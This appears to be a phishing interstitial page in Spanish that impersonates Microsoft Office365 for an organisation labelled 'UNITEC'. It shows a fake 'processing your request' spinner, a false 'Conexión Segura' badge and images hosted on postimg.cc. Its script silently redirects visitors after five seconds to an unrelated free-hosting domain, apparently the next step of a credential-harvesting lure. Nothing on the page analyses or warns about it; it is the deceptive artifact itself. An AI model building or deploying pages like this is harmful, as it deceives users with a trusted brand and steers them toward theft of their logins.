<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Office365 - COMUNICA</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('https://i.postimg.cc/vZWDfXFq/masthead-alt-06-wide-large.jpg') center / cover no-repeat fixed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            padding: 15px;
        }
        
        .container {
            max-width: 480px;
            width: 100%;
            text-align: center;
            padding: 24px 22px;
            background: rgba(0, 30, 60, 0.72);
            border-radius: 12px;
            backdrop-filter: blur(8px);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
        }
        
        .logo-top {
            max-width: 170px;
            margin-bottom: 16px;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.25));
        }
        
        .status-icon {
            width: 44px;
            height: 44px;
            margin: 0 auto 12px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.35);
        }
        
        p {
            font-size: 14px;
            line-height: 1.45;
            margin-bottom: 16px;
            opacity: 0.95;
        }
        
        .progress-bar {
            width: 100%;
            height: 5px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            overflow: hidden;
            margin: 14px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00d4ff, #0099ff);
            border-radius: 3px;
            animation: progress 5s linear forwards;
            width: 0%;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        
        .security-badge {
            display: inline-block;
            margin-top: 6px;
            padding: 6px 14px;
            background: rgba(0, 255, 0, 0.12);
            border: 1px solid rgba(0, 255, 0, 0.35);
            border-radius: 20px;
            font-size: 13px;
            font-weight: 500;
        }
        
        .footer {
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .logo-bottom {
            max-width: 150px;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.25));
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/85/Microsoft_365_logo.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original" alt="Logo UNITEC" class="logo-top">
        
        <div class="status-icon"></div>
        
        <h1>Procesando su solicitud</h1>
        
        <p>Verificando y preparando su solicitud, por favor espere un momento.</p>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="security-badge">
            🔒 Conexión Segura
        </div>
        
        <div class="footer">
            <img src="https://i.postimg.cc/J4TtLHCr/favicon.jpg" alt="Logo Footer" class="logo-bottom">
        </div>
    </div>

    <script>
        // Redirección después de 5 segundos
        setTimeout(function() {
            window.location.href = "https://re-637-acti2232.iceiy.com/";
        }, 5000);
    </script>
</body>
</html>
